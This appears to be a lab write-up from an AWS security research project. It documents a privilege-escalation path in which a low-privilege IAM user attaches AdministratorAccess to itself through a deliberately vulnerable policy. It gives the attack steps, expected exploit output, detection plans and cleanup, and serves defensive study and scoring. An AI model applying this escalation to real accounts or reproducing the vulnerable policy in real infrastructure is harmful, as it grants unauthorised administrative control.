# Path 05 — AttachPolicy Escalation

## Overview

A low-privileged user holds `iam:AttachUserPolicy` scoped to their own ARN.
They attach the AWS-managed `AdministratorAccess` policy to themselves in a
single API call and become effectively admin. This is the simplest possible
IAM escalation primitive: no version manipulation, no trust manipulation, no
role assumption, no chain.

This path is the **baseline** against which Paths 3 (CreatePolicyVersion) and
4 (AssumeRole chain) should rank as less-obvious variants of the same "modify
your way in" idea. The exploitability rubric should score Path 05 strictly
higher on ease than Paths 3 or 4 — a useful sanity check that the rubric
reflects reality.

## Attack flow

```
low-priv user (iam:AttachUserPolicy on self)
    ↓ AttachUserPolicy(UserName=self,
                       PolicyArn=arn:aws:iam::aws:policy/AdministratorAccess)
user now holds AdministratorAccess
    → admin (immediately)
```

## MITRE ATT&CK for Cloud

- **T1098** — Account Manipulation
- **T1098.003** — Account Manipulation: Additional Cloud Roles

## Prerequisites

- Baseline lab deployed (provides the `pathtriage-low-priv-attacker` user and its access keys)
- Scenario 05 lab deployed: `cd environments/scenarios/05_attachpolicy && terraform apply`
- Python 3 with `boto3` available
- Low-priv access key + secret exported as `AWS_ACCESS_KEY_ID` / `AWS_SECRET_ACCESS_KEY`

## Attack steps

```bash
# 1. Switch the shell to low-priv credentials
cd environments/baseline
export AWS_ACCESS_KEY_ID=$(terraform output -raw low_priv_access_key_id)
export AWS_SECRET_ACCESS_KEY=$(terraform output -raw low_priv_secret_access_key)
unset AWS_SESSION_TOKEN AWS_PROFILE

# 2. Run the exploit
python attacks/05_attachpolicy/exploit.py
```

## Expected output

```
[*] acting as: arn:aws:iam::<acct>:user/pathtriage-low-priv-attacker
[*] Step 1: baseline probe — can we already do privileged actions?
    [+] iam:CreateUser denied (as expected for a low-priv user)
[*] Step 2: attaching arn:aws:iam::aws:policy/AdministratorAccess to pathtriage-low-priv-attacker
    [+] attached
[*] Step 3: waiting 12s for IAM propagation
[*] Step 4: re-probing the privileged action
    [+] iam:CreateUser now SUCCEEDS — escalation confirmed
[*] Step 5: cleanup — detaching arn:aws:iam::aws:policy/AdministratorAccess
    [+] detached; lab restored to starting state

[+] Path 05 verified: low-priv user -> effective admin via AttachUserPolicy
```

See `verification_log.txt` for a captured run.

## Vulnerable configuration

A customer-managed policy is attached to the low-priv user. The policy grants
`iam:AttachUserPolicy` scoped to the user's own ARN:

```json
{
  "Sid": "DangerousAttachOnSelf",
  "Effect": "Allow",
  "Action": "iam:AttachUserPolicy",
  "Resource": "arn:aws:iam::<acct>:user/pathtriage-low-priv-attacker"
}
```

The `Resource` field permits attaching *any* managed policy (the API's
`PolicyArn` parameter is unconstrained). A more realistic real-world variant
uses `Resource = "*"`, which is strictly worse and equally exploitable.

## Why this works

The path's distinctive characteristic is its *simplicity*. Unlike Paths 3 and
4, there is no need to chain calls, mint policy versions, or exploit trust
topology. A single `iam:AttachUserPolicy` call is the entire attack.

| Path | API calls | IAM resource modified |
|------|-----------|------------------------|
| 03 — CreatePolicyVersion | 2 (`CreatePolicyVersion` + `SetDefaultPolicyVersion` — or 1 with `SetAsDefault=true`) | An existing customer-managed policy |
| 04 — AssumeRole Chain    | 2 (`AssumeRole` × 2) | None |
| 05 — AttachPolicy        | **1** (`AttachUserPolicy`) | None (only an attachment is added) |

Including this path in the catalogue is deliberate even though it is the
simplest mechanic: it serves as the rubric's *floor*. CloudGoat scenarios
and post-incident reports consistently show that real breaches happen at this
end of the spectrum, not the clever multi-step end.

The cleanup step (detaching `AdministratorAccess` at the end of the exploit)
is operationally necessary, not cosmetic. The attach is out-of-band relative
to Terraform state, so without an explicit detach, `terraform destroy` would
leave an orphan managed-policy attachment on the baseline low-priv user —
breaking the lab's "destroy returns the account to baseline" guarantee.

## Deferred sections

- **Exploitability score** — applied W5, alongside the Midway Report, under
  the rubric in `docs/scoring_rubric.md`. Expected to score as the easiest
  path in the AWS catalogue.
- **Defender output** — generated W7. Will include:
  - CloudTrail Lake query template detecting `iam:AttachUserPolicy` events
    where the actor and the target user are the same identity
  - SCP snippet denying `iam:AttachUserPolicy` and `iam:AttachGroupPolicy`
    on any AWS-managed admin policy (`AdministratorAccess`, `PowerUserAccess`,
    `IAMFullAccess`) regardless of source identity

## Cleanup

```bash
cd environments/scenarios/05_attachpolicy
terraform destroy -auto-approve

# Verify no orphan IAM resources remain
aws iam list-roles \
    --query 'Roles[?contains(RoleName, `attachpolicy`)].RoleName' \
    --output text
# (should be empty)

aws iam list-attached-user-policies \
    --user-name pathtriage-low-priv-attacker
# Should NOT include AdministratorAccess. If it does, the exploit's
# in-band cleanup (Step 5) failed; detach manually:
#   aws iam detach-user-policy --user-name pathtriage-low-priv-attacker \
#       --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

## References

- Rhino Security Labs — [AWS IAM Privilege Escalation Methods](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/) (method 1: AttachUserPolicy)
- MITRE ATT&CK for Cloud — [T1098](https://attack.mitre.org/techniques/T1098/), [T1098.003](https://attack.mitre.org/techniques/T1098/003/)
- AWS docs — [AttachUserPolicy API reference](https://docs.aws.amazon.com/IAM/latest/APIReference/API_AttachUserPolicy.html)